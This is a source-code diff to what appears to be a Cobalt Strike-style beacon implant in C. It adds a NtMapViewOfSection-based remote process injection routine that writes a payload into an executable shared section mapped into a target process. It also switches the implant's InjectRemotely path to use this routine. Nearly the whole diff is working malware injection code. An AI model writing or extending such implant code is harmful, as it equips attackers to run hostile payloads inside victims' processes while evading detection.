@@ -120,6 +120,11 @@ typedef CLIENT_ID *PCLIENT_ID;
 typedef NTSTATUS(NTAPI* FN_NTDLL_RTLCREATEUSERTHREAD)(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId);
 typedef NTSTATUS(NTAPI* FN_NTDLL_NTQUEUEAPCTHREAD)(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine, _In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL, _In_ PVOID ApcReserved OPTIONAL);
 
+typedef enum _SECTION_INHERIT {
+	ViewShare = 1,
+	ViewUnmap = 2
+} SECTION_INHERIT, * PSECTION_INHERIT;
+typedef NTSTATUS(NTAPI* FN_NTDLL_NTMAPVIEWOFSECTION)(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize, _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG Win32Protect);
 BOOL IsWow64ProcessEx(HANDLE hProcess)
 {
 	HMODULE hModule = GetModuleHandleA("kernel32");
@@ -156,18 +161,71 @@ typedef struct _PAYLOAD
 } PAYLOAD;
 
 
+char* InjectViaNtMapViewOfSection(HANDLE handle, DWORD pid, const char* payload, int size)
+{
+	/* determine the minimum allocation size based on S_PROCINJ_MINALLOC */
+	int dwSize = max(S_PROCINJ_MINALLOC, size);
 
+	/* get the handle to the ntdll module */
+	HMODULE hModule = GetModuleHandleA("ntdll.dll");
+
+	/* get the address of the NtMapViewOfSection function */
+	FN_NTDLL_NTMAPVIEWOFSECTION _NtMapViewOfSection = (FN_NTDLL_NTMAPVIEWOFSECTION)GetProcAddress(hModule, "NtMapViewOfSection");
+
+	/* check if the function was found */
+	if (_NtMapViewOfSection == NULL)
+		return NULL;
+
+	/* create a file mapping object */
+	HANDLE hFileMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL);
+
+	LPVOID lpBaseAddress = NULL;
+
+	/* check if the file mapping object was created */
+	if (hFileMapping != INVALID_HANDLE_VALUE)
+	{
+		// map a view of the file into the process's address space (use MapViewOfFile)
+		LPVOID lpFileMap = MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, dwSize);
+
+		// check if the file was mapped
+		if (lpFileMap)
+		{
+			// copy the payload into the mapped file
+			memcpy(lpFileMap, payload, size);
+
+			// call NtMapViewOfSection to map the file into the target process
+			
+			SIZE_T dwViewSize = 0;
+			NTSTATUS status = _NtMapViewOfSection(hFileMapping, handle, &lpBaseAddress, 0, 0, NULL, &dwViewSize, ViewShare, 0, S_PROCINJ_PERMS);
+
+			// unmap the file from the current process
+			UnmapViewOfFile(lpFileMap);
+		}
+
+		// close the file mapping object
+		CloseHandle(hFileMapping);
+	}
+
+	if(lpBaseAddress == NULL) {
+		const DWORD lastError = GetLastError();
+		LERROR("Allocate section and copy data failed: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ALLOC_SECTION_FAILED, lastError);
+		return NULL;
+	}
+
+	return (char*)lpBaseAddress;
+}
 
 char* InjectRemotely(INJECTION* injection, const char* payload, int size)
 {
-	/*if (S_PROCINJ_ALLOCATOR && injection->isX86NativeOrEmulated)
+	if (S_PROCINJ_ALLOCATOR && injection->isSameArchAsHostSystem)
 	{
 		return InjectViaNtMapViewOfSection(injection->process, injection->pid, payload, size);
 	}
 	else
 	{
-		return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
-	}*/
+		//return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
+	}
 	return NULL;
 }
 
@@ -440,7 +498,6 @@ BOOL ExecuteViaSetThreadContext_x64_x86EmulationMode(HANDLE hThread, LPVOID lpSt
 
 	return ResumeThread(hThread) != -1;
 }
-
 
 BOOL ExecuteViaSetThreadContext(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
 {
